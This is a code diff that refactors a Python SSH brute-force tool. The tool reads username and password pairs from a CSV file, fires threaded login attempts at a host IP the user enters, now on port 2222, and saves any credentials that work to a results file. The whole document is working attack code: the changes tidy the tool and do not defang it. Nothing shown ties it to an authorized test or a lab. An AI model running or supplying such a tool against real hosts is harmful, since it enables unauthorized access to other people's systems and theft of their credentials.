@@ -11,29 +11,28 @@ def ssh_connect(host, username, password):
     ssh_client = SSHClient()
     ssh_client.set_missing_host_key_policy(AutoAddPolicy())
     try:
-        ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)
-        with open("results.txt", "a") as fh:
-            print(f"Username - {username} and Password - {password} found.")
-            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
+        ssh_client.connect(host, port=2222, username=username, password=password, banner_timeout=300)
+        with open("result.txt", "a") as fh:
+            result = f"Username: {username}\nPassword: {password}\nWorked on host {host}\n"
+            fh.write(result)
+            print(result)
     except AuthenticationException:
-        print(f"Username - {username} and Password - {password} is Incorrect.")
+        print(f"Username - {username} and Password - {password} is incorrect.")
     except ssh_exception.SSHException:
         print("**** Attempting to connect ****")
 
 def get_ip_address():
     while True:
-        host = input("Please enter the host ip address: ")
+        host = input("Please enter the host IP address: ")
         try:
             ipaddress.IPv4Address(host)
             return host
         except ipaddress.AddressValueError:
-            print("Please enter a valid ip address.")
-            
-        
+            print("Please enter a valid IP address.")
 
-def __main__():
+def main():
     logging.getLogger('paramiko.transport').addHandler(NullHandler())
-    list_file="passwords.csv"
+    list_file = "passwords.csv"
     host = get_ip_address()
     with open(list_file) as fh:
         csv_reader = csv.reader(fh, delimiter=",")
@@ -45,4 +44,5 @@ def __main__():
                 t.start()
                 time.sleep(0.2)
 
-__main__()
+if __name__ == "__main__":
+    main()
